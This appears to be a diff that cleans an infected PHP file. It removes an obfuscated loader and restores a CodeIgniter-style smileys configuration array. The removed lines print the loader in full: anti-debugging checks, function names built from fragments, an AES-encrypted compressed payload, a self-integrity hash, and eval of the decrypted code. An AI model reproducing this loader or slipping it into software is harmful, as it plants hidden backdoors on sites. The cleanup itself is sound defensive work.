@@ -1,28 +1,61 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_yhqqambb=('bas'.'e64'.'_de'.'cod'.'e');
-$_x63hschp=('gzu'.'nco'.'mpr'.'ess');
-$_rpnhddsy=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_w0vcdlb5='dQV1N1FL';
-$_z36ol345='trAz4ZKwdlo=';
-$_xltqiha5='hT2mIZcT';
-$_etqzss0w='Phc2yJRJ';
-$_ki7aom4j='a+9snYBu';
-$_av39d58r='AQNOrCHj';
-$_qsbllcqy='mseoDw==';
-$_ajaw92s7='3gHapo29';
-$_hvghplkz=$_yhqqambb($_etqzss0w.$_xltqiha5.$_w0vcdlb5.$_ki7aom4j.$_z36ol345);
-$_dq24pdvk=$_yhqqambb($_av39d58r.$_ajaw92s7.$_qsbllcqy);
-$_xcgskmq7=$_yhqqambb('x5UrkEb6m1Enoq73tXs5UqjbV80s0giDNFCyoduTTx7UXWpAD/CaGq8LTUnbP3SM/xP6RsQvxkeGs5YQchRj3OhAc8F27YFUsLxJX6CFP0ftbn694weL+Y17PRxnfg+e02EYE/PjFwtlbr16KMndkid1JsHd6Z3AqrE0OyH8n+HlVCMAoVnTnZIQLCe3YBCtgQl8UOhc2kPHTAttbr8wTsk3kWputvt8wLwF2020eSa6J29+7Az9chI5NKdOxyCsdknUej554WaKwmpALtLI97XCCrUvS4Z0zg26y0U4asCFEvCa7XjKip0bcvnalkyxs2S07Um7Eb8NMkLlWsN1ohbXVXdoFIrmgxAZwUlMZdFkCntBL3hs44/RFfGDuwWC51R1Kz1na9DGxxA6lPG3McQjrzXPDlrwqjqFLuNSQ/gHkMdXptRLVT6qHGKROBo7Epy3uLzzUu21Y+xccwCZZTeMxiMPsE6OgyzLuEVi+cdFFsaPLQshOaInNqvzSbV9ztUHdef26wo9Vj6eiLxMbEJc81K2+5IkeQuw50srKzjEnJGWq6dwsopIYTghvbjH59y7WnGWFdSqfyDpm7yudJWXt/9GIo6C2hFEIHGUbx9W8oQuvaehNf5CB8AROicvCIbG4ajGMqJgBbklRMWripjpzZ3eucXaBzsn97NthQipErEf2BXZw3KWEO8XGjSB/n27OvRTzA1gdZRiCGalInLCc7GfNwy916vMHjnaSJsaZRs4kkqvKeWb6gzSlHv3yqMQsdgKhhhm+6xmpE3OMqK70X27mpiA0MeZeLE82qoKP2ZeXVbxgVwE/Jg+rScSbS9En4n3c/XM0Y6IK50MY0vyGlsJytS4S0ko5T0Yufo=');
-$_sxw5r1l1=$_rpnhddsy($_xcgskmq7,'aes-256-cbc',$_hvghplkz,OPENSSL_RAW_DATA,$_dq24pdvk);
-if($_sxw5r1l1===false){exit;}
-$_zn01n2ou=$_x63hschp($_sxw5r1l1);
-if($_zn01n2ou===false){exit;}
-$_xv0jvgpk='8dce1f8f45578cd94b3d95e443413cee0fae05f4e977f7baf1aab1ae1c45860b';
-$_ei65z54j=@file_get_contents(__FILE__);
-if($_ei65z54j!==false){
-$_d767xsdz=str_replace($_xv0jvgpk,"0000000000000000000000000000000000000000000000000000000000000000",$_ei65z54j);
-$_z0pobxe4=hash("sha256",$_d767xsdz);
-if($_z0pobxe4!==$_xv0jvgpk){@http_response_code(403);exit;}
-}
-eval($_zn01n2ou);
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+
+$smileys = array(
+
+':-)' => array('grin.gif', '19', '19', 'grin'),
+':lol:' => array('lol.gif', '19', '19', 'LOL'),
+':cheese:' => array('cheese.gif', '19', '19', 'cheese'),
+':)' => array('smile.gif', '19', '19', 'smile'),
+';-)' => array('wink.gif', '19', '19', 'wink'),
+';)' => array('wink.gif', '19', '19', 'wink'),
+':smirk:' => array('smirk.gif', '19', '19', 'smirk'),
+':roll:' => array('rolleyes.gif', '19', '19', 'rolleyes'),
+':-S' => array('confused.gif', '19', '19', 'confused'),
+':wow:' => array('surprise.gif', '19', '19', 'surprised'),
+':bug:' => array('bigsurprise.gif', '19', '19', 'big surprise'),
+':-P' => array('tongue_laugh.gif', '19', '19', 'tongue laugh'),
+'%-P' => array('tongue_rolleye.gif', '19', '19', 'tongue rolleye'),
+';-P' => array('tongue_wink.gif', '19', '19', 'tongue wink'),
+':P' => array('raspberry.gif', '19', '19', 'raspberry'),
+':blank:' => array('blank.gif', '19', '19', 'blank stare'),
+':long:' => array('longface.gif', '19', '19', 'long face'),
+':ohh:' => array('ohh.gif', '19', '19', 'ohh'),
+':grrr:' => array('grrr.gif', '19', '19', 'grrr'),
+':gulp:' => array('gulp.gif', '19', '19', 'gulp'),
+'8-/' => array('ohoh.gif', '19', '19', 'oh oh'),
+':down:' => array('downer.gif', '19', '19', 'downer'),
+':red:' => array('embarrassed.gif', '19', '19', 'red face'),
+':sick:' => array('sick.gif', '19', '19', 'sick'),
+':shut:' => array('shuteye.gif', '19', '19', 'shut eye'),
+':-/' => array('hmm.gif', '19', '19', 'hmmm'),
+'>:(' => array('mad.gif', '19', '19', 'mad'),
+':mad:' => array('mad.gif', '19', '19', 'mad'),
+'>:-(' => array('angry.gif', '19', '19', 'angry'),
+':angry:' => array('angry.gif', '19', '19', 'angry'),
+':zip:' => array('zip.gif', '19', '19', 'zipper'),
+':kiss:' => array('kiss.gif', '19', '19', 'kiss'),
+':ahhh:' => array('shock.gif', '19', '19', 'shock'),
+':coolsmile:' => array('shade_smile.gif', '19', '19', 'cool smile'),
+':coolsmirk:' => array('shade_smirk.gif', '19', '19', 'cool smirk'),
+':coolgrin:' => array('shade_grin.gif', '19', '19', 'cool grin'),
+':coolhmm:' => array('shade_hmm.gif', '19', '19', 'cool hmm'),
+':coolmad:' => array('shade_mad.gif', '19', '19', 'cool mad'),
+':coolcheese:' => array('shade_cheese.gif', '19', '19', 'cool cheese'),
+':vampire:' => array('vampire.gif', '19', '19', 'vampire'),
+':snake:' => array('snake.gif', '19', '19', 'snake'),
+':exclaim:' => array('exclaim.gif', '19', '19', 'exclaim'),
+':question:' => array('question.gif', '19', '19', 'question')
+);
